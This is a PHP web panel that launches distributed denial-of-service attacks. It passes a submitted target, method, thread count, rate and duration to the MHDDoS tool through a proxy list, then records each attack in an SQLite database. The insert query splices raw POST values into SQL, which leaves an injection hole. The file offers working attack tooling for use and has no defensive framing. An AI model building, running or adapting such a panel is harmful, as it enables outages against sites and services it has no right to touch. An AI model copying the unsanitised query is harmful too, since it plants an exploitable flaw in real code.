<?php

ini_set( 'display_errors', '1' );
ini_set( 'display_startup_errors', '1' );
error_reporting( E_ALL );

require __DIR__ . '/vendor/autoload.php';

use Symfony\Component\Process\Exception\ProcessFailedException;
use Symfony\Component\Process\Process;

if ( $_POST[ 'submit' ] ) {

    $process = new Process( [ '/usr/bin/python3', 'MHDDoS/start.py', $_POST[ 'method' ], $_POST[ 'target' ], 4, $_POST[ 'threads' ], 'proxy.txt', $_POST[ 'requests_per_second' ], $_POST[ 'duration' ] ] );

    try {
        $process->setOptions( [ 'create_new_console' => true ] );
        $process->start();

        saveInSQLite( $process->getPid(), $_POST[ 'method' ],  $_POST[ 'target' ], time(), $_POST[ 'duration' ] );
    } catch ( ProcessFailedException $exception ) {
        echo $exception->getMessage();
    }
}

/**
* save the new attack info in the database
*
* @param int $process_id
* @param string $attacking_method
* @param string $target_url
* @param int $start_time
* @param int $duration_in_seconds
*/

function saveInSQLite( $process_id, $attacking_method, $target_url, $start_time, $duration_in_seconds ) {
    $db = new SQLite3( 'ddos.db' );
    $sql = "INSERT INTO attacks(process_id, attacking_method, target_url, start_time, duration_in_seconds) VALUES('$process_id', '$attacking_method', '$target_url', '$start_time', '$duration_in_seconds')";
    $db->exec( $sql );

    header( 'Location: previous-attacks.php' );
}
